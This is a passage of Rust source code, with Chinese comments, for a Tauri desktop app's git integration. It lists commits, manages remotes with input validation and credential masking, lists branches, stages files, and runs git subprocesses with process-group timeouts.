                // stash 的两行内部提交（WIP on + index on）塞进日志。它们
                // 有双父提交，在 DAG 上画成三分叉噪声，且 stash 条目在
                // PyCharm 里归属独立的 Shelf/Stash 工具窗口，而非提交历史。
                // 显式列举 heads + remotes，语义等同 PyCharm 的
                // "All branches"，且天然排除 refs/stash。
                cmd.arg("--branches").arg("--remotes");
            }
        }
    }
    if let Some(p) = path.filter(|p| !p.trim().is_empty()) {
        // "refs -- path"：只看改动过该路径的提交（--follow 不适用于多路径，这里保持简单）
        // reject_option_like 与 branch 分支对齐：`--` 已挡住绝大部分注入，
        // 但 pathspec 以 `-` 开头时 git 的选项解析在 `--` 前后行为有差异，
        // 入口即拒绝，避免依赖解析细节。
        reject_option_like(&p)?;
        cmd.arg("--").arg(p);
    }

    let output = git_output(&mut cmd).map_err(|e| format!("git log failed: {}", e))?;

    if !output.status.success() {
        let err = String::from_utf8_lossy(&output.stderr).trim().to_string();
        // 空仓库是合法状态：git log 退出码非 0，但 UI 应显示空历史而不是错误。
        if err.contains("does not have any commits yet") {
            return Ok(Vec::new());
        }
        log::warn!("git log 失败: {err}");
        return Err(format!("git log failed: {err}"));
    }

    let stdout = String::from_utf8_lossy(&output.stdout);
    let parsed = parse_git_log_output(&stdout);
    let mut commits = raw_log_to_dto_seeded(parsed, &[], skip_n);

    // HEAD 祖先集合：--all 日志里标出「不在当前历史」的提交（面板背景置灰，对齐 PyCharm）。
    // rev-list 失败（空仓库等）保持 None，前端视为在历史内，不置灰。
    match git_output(git_cmd().arg("-C").arg(&dir).args(["rev-list", "HEAD"])) {
        Ok(rev) if rev.status.success() => {
            let reachable: std::collections::HashSet<String> = String::from_utf8_lossy(&rev.stdout)
                .lines()
                .map(|s| s.to_string())
                .collect();
            for c in &mut commits {
                c.in_head = Some(reachable.contains(&c.hash));
            }
        }
        // 空仓库（无 HEAD）走到这里属正常；其它失败也要留痕，否则「全在历史内」
        // 与「rev-list 挂了」看起来一样
        Ok(rev) => log::warn!(
            "git rev-list HEAD 失败: {}（提交不置灰）",
            String::from_utf8_lossy(&rev.stderr).trim()
        ),
        Err(e) => log::warn!("git rev-list HEAD 调用失败: {}", e),
    }
    Ok(commits)
}

/// Push 对话框数据：HEAD 上尚未推送到上游的提交。
/// 上游解析顺序：配置的上游分支 → 同名远程分支（origin/<branch>）→ 所有远程引用。
#[tauri::command]
pub async fn git_pending_commits(
    repo_path: Option<String>,
    max_count: Option<u32>,
) -> Result<Vec<GitCommitDto>, String> {
    // Push 对话框数据要串起 branch/upstream/log 多个 git 子进程，大仓冷启动
    // 几十毫秒，同步执行会占住 ipc worker。丢到 blocking 池让 worker 立刻
    // 脱身（与 read_directory 同一模式）。
    tauri::async_runtime::spawn_blocking(move || {
        let dir = repo_path.unwrap_or_else(|| ".".to_string());
        let limit = max_count.unwrap_or(500).to_string();

        let branch = git_output(
            git_cmd()
                .arg("-C")
                .arg(&dir)
                .args(["branch", "--show-current"]),
        )
        .map_err(|e| format!("git 调用失败: {}", e))?;
        let branch = String::from_utf8_lossy(&branch.stdout).trim().to_string();

        // 1) 配置的上游（没有上游时 rev-parse 失败是常态，但「调用失败」也要留痕，
        //    否则用户看到的会是「没有上游」而不是一条错误）
        let upstream = match git_output(git_cmd().arg("-C").arg(&dir).args([
            "rev-parse",
            "--abbrev-ref",
            "--symbolic-full-name",
            "@{upstream}",
        ])) {
            Ok(o) if o.status.success() => {
                let name = String::from_utf8_lossy(&o.stdout).trim().to_string();
                if name.is_empty() {
                    None
                } else {
                    Some(name)
                }
            }
            Ok(_) => None,
            Err(e) => {
                log::warn!("git rev-parse @{{upstream}} 调用失败: {}", e);
                None
            }
        };

        // 2) 同名远程分支 origin/<branch>
        let fallback = if upstream.is_none() && !branch.is_empty() {
            let candidate = format!("refs/remotes/origin/{}", branch);
            match git_output(
                git_cmd()
                    .arg("-C")
                    .arg(&dir)
                    .args(["show-ref", "--verify", "--quiet", &candidate]),
            ) {
                Ok(o) if o.status.success() => Some(candidate),
                Ok(_) => None,
                Err(e) => {
                    log::warn!("git show-ref {} 调用失败: {}", candidate, e);
                    None
                }
            }
        } else {
            None
        };

        let mut cmd = git_cmd();
        cmd.arg("-C").arg(&dir).arg("log").arg("-n").arg(&limit);
        // --pretty 必须排在 --end-of-options 之前（见 git_log_impl 的说明）
        cmd.arg("--pretty=format:%H%x09%h%x09%an%x09%ae%x09%ct%x09%s%x09%D%x09%P");
        match (upstream, fallback) {
            // base..HEAD 必须是单个参数（含省略侧的区间语法）。base 也可能来自
            // 仓库配置（branch.<x>.remote=. 时上游是本地 ref），因此同样加
            // --end-of-options 防选项注入。
            (Some(base), _) => {
                cmd.arg("--end-of-options").arg(format!("{}..HEAD", base));
            }
            (None, Some(base)) => {
                cmd.arg("--end-of-options").arg(format!("{}..HEAD", base));
            }
            // 3) 无任何对应远程分支：显示所有不在远程引用上的提交。
            //    注意仓库没有任何远程引用时 --not --remotes 会输出空，需跳过
            (None, None) => {
                let has_remotes = match git_output(
                    git_cmd()
                        .arg("-C")
                        .arg(&dir)
                        .args(["for-each-ref", "refs/remotes/"]),
                ) {
                    Ok(o) => {
                        o.status.success() && !String::from_utf8_lossy(&o.stdout).trim().is_empty()
                    }
                    Err(e) => {
                        // 不再静默：失败会让「没有远程」与「git 出错」看起来一样
                        log::warn!("git for-each-ref refs/remotes/ 失败: {}", e);
                        false
                    }
                };
                if has_remotes {
                    cmd.arg("--not").arg("--remotes");
                }
            }
        }

        let output = git_output(&mut cmd).map_err(|e| format!("git log failed: {}", e))?;
        if !output.status.success() {
            log::warn!(
                "git log（待推送提交）失败: {}",
                String::from_utf8_lossy(&output.stderr).trim()
            );
            return Ok(Vec::new());
        }
        let stdout = String::from_utf8_lossy(&output.stdout);
        Ok(raw_log_to_dto_seeded(parse_git_log_output(&stdout), &[], 0))
    })
    .await
    .map_err(|e| format!("git_pending_commits 任务失败: {e}"))?
}

#[derive(Serialize, Deserialize, Debug, Clone)]
#[serde(rename_all = "camelCase")]
pub struct GitRemoteDto {
    pub name: String,
    pub url: String,
}

/// 网络命令（push/pull/fetch）的输出文本：stdout+stderr 拼接后脱敏。
///
/// git 的 progress 与错误信息会原样回显 remote URL，而 URL 里可能嵌着
/// token（`https://user:ghp_xxx@github.com/...`）。脱敏在此收口，
/// 三个网络命令共用一个出口，避免漏改。
fn network_output_text(output: &std::process::Output) -> String {
    let raw = format!(
        "{}{}",
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );
    // 仅在疑似含凭据时才分配新串：绝大多数输出没有 `://...@`，
    // mask_credentials 逐 token 扫描虽便宜，仍值得短路。
    if raw.contains("://") && raw.contains('@') {
        mask_credentials(&raw)
    } else {
        raw
    }
}

/// 列出仓库的远程（fetch URL）
#[tauri::command]
pub fn git_remote_list(repo_path: Option<String>) -> Result<Vec<GitRemoteDto>, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    let output = git_output(git_cmd().arg("-C").arg(&dir).args(["remote", "-v"]))
        .map_err(|e| format!("git remote failed: {}", e))?;
    if !output.status.success() {
        log::warn!(
            "git remote -v 失败: {}",
            String::from_utf8_lossy(&output.stderr).trim()
        );
        return Ok(Vec::new());
    }

    let stdout = String::from_utf8_lossy(&output.stdout);
    let mut remotes = Vec::new();
    let mut seen = std::collections::HashSet::new();
    for line in stdout.lines() {
        // "origin\tgit@github.com:x/y.git (fetch)"
        let Some((name, rest)) = line.split_once('\t') else {
            continue;
        };
        if !seen.insert(name.to_string()) {
            continue;
        }
        let url = rest
            .trim()
            .trim_end_matches("(fetch)")
            .trim_end_matches("(push)")
            .trim();
        remotes.push(GitRemoteDto {
            name: name.to_string(),
            // 带 token 的 remote（https://user:ghp_xxx@...）会把长期凭据
            // 送进前端 UI 与 Console 日志：脱敏后再交给调用方。
            url: mask_credentials(url),
        });
    }
    Ok(remotes)
}

/// 校验远程名（remote add / rename / remove / set-url 共用）。
///
/// 远程名最终落在 `.git/config [remote "<name>"]` 节名里，也会被拼进
/// `git push <name>` 等位置参数。`reject_option_like` 挡前导 `-`（选项注入），
/// 这里再挡空白与 ref 通配/分隔符 —— 含空格的名字 git 虽然接受，但后续命令
/// 的 argv 拼接与 UI 展示都会出幺蛾子，不如建的时候就拒绝。
fn validate_remote_name(raw: &str) -> Result<String, String> {
    let name = raw.trim();
    if name.is_empty() {
        return Err(crate::error_proto::coded("name_empty", ""));
    }
    reject_option_like(name)?;
    if name.contains(':')
        || name.contains(char::is_whitespace)
        || name.contains(['?', '*', '[', '\\', '^', '~'])
    {
        return Err(crate::error_proto::coded("name_invalid", name));
    }
    if name == "@" || name.starts_with('/') || name.starts_with('.') || name.contains("..") {
        return Err(crate::error_proto::coded("name_invalid", name));
    }
    Ok(name.to_string())
}

/// 校验远程 URL：非空、无控制字符（argv 本身是单参数，换行 harmless，
/// 但含换行/控制符的 URL 一定是粘贴事故或注入，早拒早省事）。
/// 错误回显走 mask_credentials：用户可能粘贴了带 token 的 https URL。
fn validate_remote_url(raw: &str) -> Result<String, String> {
    let url = raw.trim();
    if url.is_empty() {
        return Err(crate::error_proto::coded("name_empty", ""));
    }
    reject_option_like(url)?;
    if url.contains(char::is_control) {
        return Err(crate::error_proto::coded(
            "name_invalid",
            mask_credentials(url),
        ));
    }
    Ok(url.to_string())
}

fn git_remote_write(dir: &str, args: &[&str]) -> Result<(), String> {
    let mut cmd = git_cmd();
    cmd.arg("-C").arg(dir).arg("remote");
    for a in args {
        cmd.arg(a);
    }
    let output = git_output(&mut cmd).map_err(|e| format!("git remote failed: {}", e))?;
    if !output.status.success() {
        let stderr = String::from_utf8_lossy(&output.stderr);
        return Err(mask_credentials(stderr.trim()));
    }
    Ok(())
}

/// 新增远程（对齐 PyCharm Git Remotes → +）：git remote add <name> <url>
#[tauri::command]
pub fn git_remote_add(repo_path: Option<String>, name: String, url: String) -> Result<(), String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    let name = validate_remote_name(&name)?;
    let url = validate_remote_url(&url)?;
    git_remote_write(&dir, &["add", &name, &url])
}

/// 删除远程（对齐 PyCharm Git Remotes → −）：git remote remove <name>。
/// origin 也允许删（PyCharm 同理）：删的是本地配置，不影响远端仓库。
#[tauri::command]
pub fn git_remote_remove(repo_path: Option<String>, name: String) -> Result<(), String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    let name = validate_remote_name(&name)?;
    git_remote_write(&dir, &["remove", &name])
}

/// 重命名远程：git remote rename <old> <new>（跟踪引用一并改写）。
#[tauri::command]
pub fn git_remote_rename(
    repo_path: Option<String>,
    old_name: String,
    new_name: String,
) -> Result<(), String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    let old_name = validate_remote_name(&old_name)?;
    let new_name = validate_remote_name(&new_name)?;
    git_remote_write(&dir, &["rename", &old_name, &new_name])
}

/// 修改远程 URL：git remote set-url <name> <url>（fetch 与 push 同改，
/// 除非 push url 被单独设置过 —— git 原生语义，不另行处理）。
#[tauri::command]
pub fn git_remote_set_url(
    repo_path: Option<String>,
    name: String,
    url: String,
) -> Result<(), String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    let name = validate_remote_name(&name)?;
    let url = validate_remote_url(&url)?;
    git_remote_write(&dir, &["set-url", &name, &url])
}

/// 把 URL / 输出文本里的凭据段替换为 `***`。
///
/// git remote 常见两种带凭据形态：
///   https://user:ghp_token@github.com/o/r.git
///   https://ghp_token@github.com/o/r.git
/// 以及 ssh 的 `ssh://git:pass@host/...`。`git remote -v`、push/pull/fetch 的
/// progress 与 stderr 都会原样回显它们。这些字符串一旦进入前端 UI 或
/// Console 日志，截图即可泄露长期有效的 token。
///
/// 只脱敏「@ 之前、scheme 之后」的 userinfo 段，域名与路径保持不变，
/// 用户仍能看出连的是哪个仓库。
fn mask_credentials(text: &str) -> String {
    // 逐段扫描而非一次性正则替换：文本里可能同时出现 URL 与普通句子，
    // 逐 token 处理能避免把无关的 `@`（如邮箱）误判为凭据分隔符。
    let mut out = String::with_capacity(text.len());
    for token in split_keep_urls(text) {
        if let Some(masked) = mask_url_userinfo(&token) {
            out.push_str(&masked);
        } else {
            out.push_str(&token);
        }
    }
    out
}

/// 按 `scheme://` 边界切分文本，保留分隔符本身。
fn split_keep_urls(text: &str) -> Vec<String> {
    let mut parts = Vec::new();
    let mut rest = text;
    while let Some(idx) = rest.find("://") {
        // 回退到 scheme 起点（只接受字母数字 + . - 后紧跟 ://）
        let scheme_start = rest[..idx]
            .rfind(|c: char| !(c.is_ascii_alphanumeric() || c == '.' || c == '-' || c == '+'))
            .map(|i| i + 1)
            .unwrap_or(0);
        // scheme 前必须不是 URL 已消费的部分：简单起见从 idx+3 起继续找下一个 ://
        if scheme_start == idx {
            // 形如 "://"：无 scheme，跳过这个位置
            parts.push(rest[..idx + 3].to_string());
            rest = &rest[idx + 3..];
            continue;
        }
        parts.push(rest[..scheme_start].to_string());
        // URL 体：到下一个空白或常见终止符为止
        let after = &rest[scheme_start..];
        let url_len = after
            .find(|c: char| c.is_whitespace() || c == '\'' || c == '"' || c == ')' || c == ']')
            .unwrap_or(after.len());
        parts.push(after[..url_len].to_string());
        rest = &after[url_len..];
    }
    if !rest.is_empty() {
        parts.push(rest.to_string());
    }
    parts
}

/// 若 `token` 是带 userinfo 的 URL，返回脱敏后的 URL；否则 None。
fn mask_url_userinfo(token: &str) -> Option<String> {
    let scheme_end = token.find("://")? + 3;
    let (scheme, body) = token.split_at(scheme_end);
    // userinfo 段结束于第一个 '@'；其后才是 host
    let at = body.find('@')?;
    let (userinfo, host_and_path) = body.split_at(at);
    if userinfo.is_empty() {
        return None;
    }
    Some(format!("{}***{}", scheme, host_and_path))
}

/// push/pull/fetch 需要网络与凭据；禁止 git 交互式询问凭据，避免命令永久挂起。
/// 无凭据时 git 会快速失败并把原因写进 stderr 返回给前端。
fn network_git_cmd(dir: &str) -> Command {
    let mut cmd = git_cmd();
    cmd.arg("-C").arg(dir);
    // 禁止 git / 凭据管理器交互式询问（否则命令永久挂起，无凭据时快速失败）
    cmd.env("GIT_TERMINAL_PROMPT", "0");
    cmd.env("GCM_INTERACTIVE", "never");
    // ssh 同理：BatchMode 禁用 passphrase/主机确认提示，accept-new 自动信任新主机
    cmd.env(
        "GIT_SSH_COMMAND",
        "ssh -oBatchMode=yes -oStrictHostKeyChecking=accept-new",
    );
    cmd
}

/// 带超时地执行命令：stdout/stderr 由后台线程持续读取（避免管道缓冲填满导致死锁），
/// 超时后杀**整个进程组**并把 stderr 末行带回给界面
fn run_with_timeout(mut cmd: Command, secs: u64) -> Result<std::process::Output, String> {
    run_with_timeout_spawn(&mut cmd, Duration::from_secs(secs))
}

/// 超时后等 reader 线程收尾的宽限期。
///
/// 调用线程必须在「超时 + 宽限期」内返回：逃出进程组的孙进程（setsid 的守护
/// 进程）可能继续持有输出管道，谁也不能凭它把调用线程永久按住。
const READER_GRACE: Duration = Duration::from_millis(500);

/// 被放弃的 reader 线程数上限，超过就记一条日志。
///
/// 放弃是无奈之举（见 `run_with_timeout_spawn` 的注释），但要可观测：
/// 每次超时最多放弃 2 个线程，正常情况下它们会随进程组被 SIGKILL 而立刻 EOF
/// 退出 —— 计数长期不降说明有进程逃出了进程组。
const ABANDONED_READERS_WARN: usize = 8;

/// 已被放弃、仍在运行的 reader 线程数（仅用于日志观测）。
static ABANDONED_READERS: std::sync::atomic::AtomicUsize = std::sync::atomic::AtomicUsize::new(0);

/// 对一个子进程所在的**进程组**发 SIGKILL。
///
/// `Child::kill()` 只作用于直接子进程，而 git 的钩子（husky/lefthook 跑
/// prettier/tsc/测试）、ssh、git-remote-https 全是孙进程：它们继承并持有
/// stdout/stderr 管道，杀掉 git 本身并不能让管道 EOF，调用线程在
/// `read_to_end` 上永远等不到返回。实测 pre-commit 里 `sleep 40` 会让「15 秒
/// 超时」的提交实际阻塞 40.5 秒，返回的却是「已终止」。
///
/// 不引入 libc：用系统 kill(1)，负数 pid 即进程组。子进程由
/// `process_group(0)` 起在独立进程组，其 pgid 就是自身 pid。
#[cfg(unix)]
fn kill_process_group(pid: u32) {
    let pgid = format!("-{}", pid);
    for prog in ["/bin/kill", "/usr/bin/kill"] {
        if Command::new(prog)
            .args(["-KILL", &pgid])
            .status()
            .map(|s| s.success())
            .unwrap_or(false)
        {
            return;
        }
    }
    // busybox / 非标准发行版没有这两个路径：退回 PATH 查找
    let _ = Command::new("kill").args(["-KILL", &pgid]).status();
}

/// Windows 没有进程组（要 Job Object，需引 windows-sys，本仓库不引依赖）：
/// 退化为与修复前一致的「只杀直接子进程」，超时文案会如实说明可能仍在收尾。
#[cfg(not(unix))]
fn kill_process_group(_pid: u32) {}

/// 起一个管道 reader 线程：读到 EOF 后把缓冲交回（接收端已放弃时 send 失败即丢弃）。
///
/// 读管道是阻塞的，因此它必须在独立线程上；调用线程只用带 deadline 的 recv
/// 等它，等不到就放弃（detach）—— 线程泄漏但调用线程按时返回。
fn spawn_pipe_reader<R: std::io::Read + Send + 'static>(
    mut pipe: R,
    tx: std::sync::mpsc::Sender<Vec<u8>>,
    abandoned: std::sync::Arc<std::sync::atomic::AtomicBool>,
) -> std::thread::JoinHandle<()> {
    std::thread::spawn(move || {
        let mut buf = Vec::new();
        let _ = pipe.read_to_end(&mut buf);
        let _ = tx.send(buf);
        // 自己是「被放弃」的那个：退出时把计数还回去（正常路径不会走到这里）
        if abandoned.swap(false, std::sync::atomic::Ordering::Relaxed) {
            ABANDONED_READERS.fetch_sub(1, std::sync::atomic::Ordering::Relaxed);
        }
    })
}

/// 等 reader 交回缓冲，直到 deadline。`None` = 到点仍未等到（线程仍在阻塞读）。
fn recv_until(
    rx: &std::sync::mpsc::Receiver<Vec<u8>>,
    deadline: std::time::Instant,
) -> Option<Vec<u8>> {
    use std::sync::mpsc::RecvTimeoutError;
    let remaining = deadline.saturating_duration_since(std::time::Instant::now());
    match rx.recv_timeout(remaining) {
        Ok(buf) => Some(buf),
        // reader 线程异常结束：视为「无输出且已结束」，不让调用方白等 deadline
        Err(RecvTimeoutError::Disconnected) => Some(Vec::new()),
        Err(RecvTimeoutError::Timeout) => None,
    }
}

/// 标记一个 reader 线程被放弃（仅观测，见 `ABANDONED_READERS_WARN`）。
fn note_abandoned_reader(abandoned: &std::sync::atomic::AtomicBool) {
    use std::sync::atomic::Ordering;
    abandoned.store(true, Ordering::Relaxed);
    let live = ABANDONED_READERS.fetch_add(1, Ordering::Relaxed) + 1;
    if live >= ABANDONED_READERS_WARN {
        log::warn!(
            "已有 {} 个管道读取线程被放弃（子进程可能逃出了进程组），请留意进程泄漏",
            live
        );
    }
}

/// 在 `grace` 内取子进程状态；一直没退出则杀掉整个进程组并置 `timed_out`。
fn wait_or_kill(
    child: &mut std::process::Child,
    pid: u32,
    grace: Duration,
    timed_out: &mut bool,
) -> Option<std::process::ExitStatus> {
    let deadline = std::time::Instant::now() + grace;
    loop {
        match child.try_wait() {
            Ok(Some(status)) => return Some(status),
            Ok(None) => {}
            Err(_) => return None,
        }
        if std::time::Instant::now() >= deadline {
            *timed_out = true;
            kill_process_group(pid);
            let _ = child.kill();
            return child.wait().ok();
        }
        std::thread::sleep(Duration::from_millis(10));
    }
}

/// `run_with_timeout` 的 `&mut Command` 版本：命令链的终态就是 `&mut Command`，
/// 多一次所有权转移只会逼出 `.clone()`。
///
/// 超时后调用线程在 `timeout + READER_GRACE` 内必定返回：管道读取不再发生在
/// 调用线程上（旧实现阻塞在 `read_to_end`，看门狗杀了 git 也解除不了孙进程
/// 对管道的持有）。代价是极端情况下可能放弃 1~2 个 reader 线程（见
/// `note_abandoned_reader`）。
///
/// `pub(crate)`：pty.rs 的终端占用探测也要有界超时（`ps` 卡住不能拖死关闭流程）。
pub(crate) fn run_with_timeout_spawn(
    cmd: &mut Command,
    timeout: Duration,
) -> Result<std::process::Output, String> {
    use std::sync::atomic::{AtomicBool, Ordering};
    use std::sync::{mpsc, Arc};
    use std::time::Instant;

    // 子进程起在独立进程组里：超时时才能连同孙进程一起杀干净（见 kill_process_group）。
    #[cfg(unix)]
    {
        use std::os::unix::process::CommandExt;
        cmd.process_group(0);
    }

    cmd.stdout(Stdio::piped()).stderr(Stdio::piped());
    let mut child = cmd.spawn().map_err(|e| format!("进程启动失败: {}", e))?;
    let pid = child.id();
    // take() 在上面的 piped() 之后必为 Some，但这里走错误路径：
    // 本函数在唯一的 ipc:// worker 线程上运行，panic 面能收窄就收窄。
    let stdout_pipe = child
        .stdout
        .take()
        .ok_or_else(|| "无法接管子进程 stdout".to_string())?;
    let stderr_pipe = child
        .stderr
        .take()
        .ok_or_else(|| "无法接管子进程 stderr".to_string())?;

    // 两个管道各起一个 reader 线程（旧实现把 stdout 留在调用线程以求省一个
    // 线程，代价是调用线程被 stdout 按住 —— 正是 2.1 的根因）。两个都后台读
    // 也顺带消除了「stderr 先排空」的顺序约束：两个管道同时在排空，不存在
    // 子进程写 stderr 写满而阻塞在写 stdout 上的经典管道死锁。
    let out_abandoned = Arc::new(AtomicBool::new(false));
    let err_abandoned = Arc::new(AtomicBool::new(false));
    let (out_tx, out_rx) = mpsc::channel::<Vec<u8>>();
    let (err_tx, err_rx) = mpsc::channel::<Vec<u8>>();
    let t_out = spawn_pipe_reader(stdout_pipe, out_tx, Arc::clone(&out_abandoned));
    let t_err = spawn_pipe_reader(stderr_pipe, err_tx, Arc::clone(&err_abandoned));

    let deadline = Instant::now() + timeout;
    let mut timed_out = false;
    let out = match recv_until(&out_rx, deadline) {
        Some(buf) => buf,
        None => {
            // 到点还没读到 stdout EOF。先确认子进程本身是否已经退出：刚好在
            // 截止点上收尾的命令不该被误判为超时。
            let exited = matches!(child.try_wait(), Ok(Some(_)));
            if !exited {
                timed_out = true;
                kill_process_group(pid);
                let _ = child.kill();
            }
            // 进程组被杀后管道写端全部关闭，reader 应立刻 EOF；只有逃出进程组
            // 的孙进程还能把它按住 —— 宽限期一到就放弃它，保证按时返回。
            match recv_until(&out_rx, Instant::now() + READER_GRACE) {
                Some(buf) => buf,
                None => {
                    note_abandoned_reader(&out_abandoned);
                    Vec::new()
                }
            }
        }
    };

    // stderr：正常情况下此刻也已 EOF（子进程退出即关闭两个管道）；同样只等宽限期。
    let err = match recv_until(&err_rx, Instant::now() + READER_GRACE) {
        Some(buf) => buf,
        None => {
            note_abandoned_reader(&err_abandoned);
            Vec::new()
        }
    };
    let out_eof = !out_abandoned.load(Ordering::Relaxed);
    let err_eof = !err_abandoned.load(Ordering::Relaxed);

    // stdout EOF 后进程通常已退出；仍不退出（提前关了 stdout 却不肯收尾）的
    // 按超时处理，不谎报「已完成」。
    let status = wait_or_kill(&mut child, pid, READER_GRACE, &mut timed_out);

    // 已结束的 reader 才 join（未结束的 join 会阻塞，与放弃的初衷矛盾）
    if out_eof {
        let _ = t_out.join();
    }
    if err_eof {
        let _ = t_err.join();
    }

    if timed_out {
        let err_text = String::from_utf8_lossy(&err).to_string();
        let last = err_text
            .lines()
            .rev()
            .find(|l| !l.trim().is_empty())
            .unwrap_or("无输出");
        // 只有两个管道都读到 EOF 才敢说「已终止」：EOF 意味着所有持有管道的
        // 进程都已退出。否则如实写明可能仍在收尾 —— 旧实现无论实际情况如何
        // 都宣称「已终止」，实测能差 25 秒以上，是误导性提示。
        let note = if out_eof && err_eof {
            "已终止整个进程组"
        } else {
            "已请求终止，但子进程（或其派生的进程）可能仍在收尾"
        };
        return Err(format!(
            "命令超过 {} 秒未完成，{}——通常是在等待凭据或网络无响应。git 输出：{}",
            timeout.as_secs(),
            note,
            last
        ));
    }
    // 正常路径下 wait 必有状态；仍走错误路径而非 expect，与上面的
    // take() 同理——ipc worker 上不写 panic。
    let status = status.ok_or_else(|| "进程状态不可用".to_string())?;
    Ok(std::process::Output {
        status,
        stdout: out,
        stderr: err,
    })
}

/// 解析 %(upstream:track) 输出，如 "[ahead 2, behind 1]" / "[gone]"
fn parse_upstream_track(track: &str) -> (u32, u32) {
    let inner = track.trim().trim_start_matches('[').trim_end_matches(']');
    let mut ahead = 0u32;
    let mut behind = 0u32;
    for part in inner.split(',') {
        let part = part.trim();
        if let Some(n) = part.strip_prefix("ahead ") {
            ahead = n.trim().parse().unwrap_or(0);
        } else if let Some(n) = part.strip_prefix("behind ") {
            behind = n.trim().parse().unwrap_or(0);
        }
    }
    (ahead, behind)
}

#[tauri::command]
pub async fn git_branches(repo_path: Option<String>) -> Result<Vec<GitBranchDto>, String> {
    // refreshGit 三件套之一，见 git_log 的说明：同步执行会在 ipc worker
    // 上与 git_log/git_status 串行，面板刷新要等三倍时长。
    tauri::async_runtime::spawn_blocking(move || {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    let output = git_output(git_cmd()
        .arg("-C")
        .arg(&dir)
        .args([
            "-c",
            "core.quotepath=false",
            "for-each-ref",
            "--format=%(HEAD)%09%(refname)%09%(refname:short)%09%(upstream:short)%09%(upstream:track)",
            "refs/heads/",
            "refs/remotes/",
        ]))
        .map_err(|e| format!("git branch failed: {}", e))?;

    if !output.status.success() {
        // 不再静默返回空列表：git 出错与「没有分支」在界面上完全一样，
        // 用户只能看到空面板。至少留下日志。
        log::warn!(
            "git for-each-ref 失败: {}",
            String::from_utf8_lossy(&output.stderr).trim()
        );
        return Ok(Vec::new());
    }

    let stdout = String::from_utf8_lossy(&output.stdout);
    let mut branches = Vec::new();

    for line in stdout.lines() {
        let parts: Vec<&str> = line.split('\t').collect();
        if parts.len() < 5 {
            continue;
        }
        let refname = parts[1];
        // origin/HEAD 这类符号引用不作为分支展示
        if refname.starts_with("refs/remotes/") && refname.ends_with("/HEAD") {
            continue;
        }

        let is_remote = refname.starts_with("refs/remotes/");
        let upstream = parts[3].trim();
        let (ahead, behind) = parse_upstream_track(parts[4]);

        branches.push(GitBranchDto {
            name: decode_git_path(parts[2]),
            is_current: parts[0] == "*",
            is_remote,
            tracking: if is_remote || upstream.is_empty() {
                None
            } else {
                Some(upstream.to_string())
            },
            ahead: if ahead > 0 { Some(ahead) } else { None },
            behind: if behind > 0 { Some(behind) } else { None },
        });
    }

    Ok(branches)
    })
    .await
    .map_err(|e| format!("git_branches 任务失败: {e}"))?
}

/// 将文件加入版本控制/暂存区（git add）；未跟踪文件加入后状态变为 A
#[tauri::command]
pub fn git_add(repo_path: Option<String>, paths: Vec<String>) -> Result<String, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    let clean: Vec<String> = paths
        .iter()
        .map(|s| s.trim())
        .filter(|s| !s.is_empty())
        .map(|s| {
            let rel = to_repo_relative(&dir, s)?;
            ensure_safe_git_path(&rel)?;
            Ok(rel)
        })
        .collect::<Result<Vec<_>, String>>()?;
    if clean.is_empty() {
        return Ok(String::new());
    }
    let mut cmd = git_cmd();
    cmd.arg("-C")
        .arg(&dir)
        .args(["-c", "core.quotepath=false"])
        .arg("add")
        .arg("--");
    for p in &clean {
        cmd.arg(p);
    }
    let output = git_output_local(&mut cmd).map_err(|e| format!("git add failed: {}", e))?;
    if !output.status.success() {
        return Err(String::from_utf8_lossy(&output.stderr).to_string());
    }
    Ok(String::from_utf8_lossy(&output.stdout).to_string())
}

/// 解析 `-z` 输出（NUL 分隔、无引号）。
fn split_nul_paths(buf: &[u8]) -> Vec<String> {
    buf.split(|b| *b == 0)
        .filter(|part| !part.is_empty())
        .map(|part| String::from_utf8_lossy(part).into_owned())
        .collect()
}

/// 用 `git ls-files` 判断勾选路径在 index 中的状态。
///
/// `others=true` 时只返回**未被 .gitignore 忽略**的未跟踪文件，
/// 与 `git add` 的可添加集合一致；这样不会把 `!!` 的路径带进提交。
fn git_ls_files_paths(dir: &str, paths: &[String], others: bool) -> Result<Vec<String>, String> {
    let mut cmd = git_cmd();
    cmd.arg("-C")
        .arg(dir)
        .args(["-c", "core.quotepath=false", "ls-files"]);
    if others {
        cmd.args(["--others", "--exclude-standard"]);
    }
    cmd.arg("-z").arg("--").args(paths);
    let out = git_output_local(&mut cmd).map_err(|e| format!("git ls-files failed: {}", e))?;
    if !out.status.success() {
        return Err(String::from_utf8_lossy(&out.stderr).to_string());
    }
    Ok(split_nul_paths(&out.stdout))
}
/// 获取当前暂存区中有变更（A/M/D/R/C）的文件列表。
fn git_staged_paths(dir: &str) -> Result<HashSet<String>, String> {
    let mut cmd = git_cmd();
    cmd.arg("-C").arg(dir).args([
        "-c",
        "core.quotepath=false",
        "diff",
        "--name-only",
        "--cached",
        "-z",
    ]);
    let out = git_output_local(&mut cmd).map_err(|e| format!("git diff --cached failed: {}", e))?;
    if !out.status.success() {
        return Err(String::from_utf8_lossy(&out.stderr).to_string());
    }
    Ok(split_nul_paths(&out.stdout).into_iter().collect())
}

/// Stage the explicitly selected commit paths, returning the paths that are
/// actually committable.
///
/// PyCharm 允许提交位于被忽略目录内的**已跟踪**文件（例如 `.idea/.gitignore`），
/// 但 `git add -- .idea/.gitignore` 会因父目录命中 `.gitignore` 直接报
/// “paths are ignored”。同时支持暂存区删除态（`git rm --cached` / 暂存区删除）
/// 与部分暂存文件的提交。
fn stage_selected_for_commit(dir: &str, selected: &[String]) -> Result<Vec<String>, String> {
    let staged_now = git_staged_paths(dir)?;
    let tracked_now = git_ls_files_paths(dir, selected, false)?;
    let tracked_set: HashSet<&str> = tracked_now.iter().map(String::as_str).collect();

    let mut already_staged = Vec::new();
    let mut needs_stage_tracked = Vec::new();
    let mut untracked = Vec::new();

    for p in selected {
        if staged_now.contains(p) {
            already_staged.push(p.clone());
        } else if tracked_set.contains(p.as_str()) {
            needs_stage_tracked.push(p.clone());
        } else {
            untracked.push(p.clone());
        }
    }

    if !needs_stage_tracked.is_empty() {
        let mut add = git_cmd();
        add.arg("-C")
            .arg(dir)
